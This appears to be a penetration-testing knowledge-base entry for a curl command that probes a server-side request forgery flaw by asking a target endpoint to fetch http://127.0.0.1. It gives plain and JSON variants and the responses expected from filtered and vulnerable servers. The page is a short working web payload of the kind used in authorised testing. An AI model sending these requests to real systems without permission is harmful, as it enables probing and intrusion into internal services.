---
type: command
executor: bash
data: 'curl -X POST $_SSRF_ENDPOINT -d "url=http://127.0.0.1"'
output: null
platforms:
  - linux
  - macos
  - windows
tags:
  - ssrf
  - testing
verified: true
validated: true
---

# Curl Basic SSRF Payload

## Command

```bash
curl -X POST $_SSRF_ENDPOINT -d "url=http://127.0.0.1"
```

## Description

This command tests a basic SSRF payload by sending a POST request to a vulnerable endpoint, attempting to fetch from localhost (127.0.0.1). It helps confirm the presence of digit-based filters.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_SSRF_ENDPOINT | The URL of the SSRF-vulnerable endpoint (e.g., http://target.com/api/fetch) | Yes |
| -X POST | Specifies POST method | Built-in |
| -d | Data to send in the request body | Built-in |

## Examples

### Basic Usage

```bash
curl -X POST http://target.com/ssrf -d "url=http://127.0.0.1"
```

### Advanced Usage (with JSON)

```bash
curl -X POST http://target.com/ssrf -H "Content-Type: application/json" -d '{"url":"http://127.0.0.1"}'
```

## Expected Output

If filtered: `{"error":"Invalid URL"}` or HTTP 403.
If vulnerable: Internal response like `HTTP/1.1 200 OK\nContent: Localhost page` or error from internal service (e.g., connection refused).

## Related

- [[procedures/unicode-bypass-of-server-side-request-forgery-filters]]
- [[commands/curl-unicode-ssrf-payload]]
